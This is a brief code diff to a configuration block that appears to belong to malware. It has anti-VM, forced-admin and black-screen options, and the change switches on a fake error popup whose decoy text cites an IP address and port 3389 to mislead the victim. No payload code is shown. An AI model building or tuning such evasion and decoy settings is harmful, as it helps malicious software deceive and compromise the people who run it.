@@ -12,8 +12,8 @@ config = {
     'antivm': False,  
     'force_admin': False, 
     'black_screen': True, 
-    'error': False, 
-    'error_message': 'Failed To Create Process\nclick "ok" to Continue',
+    'error': True, 
+    'error_message': 'Failed To Create SIR Tunnel to { 81.16.176.41 : 3389 }\nclick "ok" to Continue',
 }
 
 class functions(object):
